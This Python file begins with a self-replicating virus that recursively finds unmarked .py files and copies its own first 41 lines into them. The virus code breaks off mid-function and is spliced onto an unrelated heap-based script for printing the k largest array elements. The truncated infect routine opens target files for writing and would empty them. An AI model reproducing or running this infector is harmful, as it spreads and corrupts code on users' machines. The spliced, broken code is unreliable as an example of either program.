#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
#importing heapq module
#to implement heap
import heapq as hq
 
def FirstKelements(arr, size, k):
    # Creating Min Heap for given
    # array with only k elements
    # Create min heap using heapq module
    minHeap = []
 
    for i in range(k):
        minHeap.append(arr[i])
    hq.heapify(minHeap)
    # Loop For each element in array
    # after the kth element
 
    for i in range(k, size):
        # If current element is smaller
        # than minimum ((top element of
        # the minHeap) element, do nothing
        # and continue to next element
 
        if minHeap[0] > arr[i]:
            continue
        # Otherwise Change minimum element
        # (top element of the minHeap) to
        # current element by polling out
        # the top element of the minHeap
        else:
              #deleting top element of the min heap
            minHeap[0] = minHeap[-1]
            minHeap.pop()
            minHeap.append(arr[i])
            #maintaining heap again using
            # O(n) time operation....
            hq.heapify(minHeap)
    # Now min heap contains k maximum
    # elements, Iterate and print
    for i in minHeap:
        print(i, end=" ")
 
 
# Driver code
arr = [11, 3, 2, 1, 15, 5, 4, 45, 88, 96, 50, 45]
size = len(arr)
# Size of Min Heap
k = 3
FirstKelements(arr, size, k)
'''Code is written by Rajat Kumar.....'''
'''
Time Complexity: O(n*log(n))
Space Complexity: O(n)
'''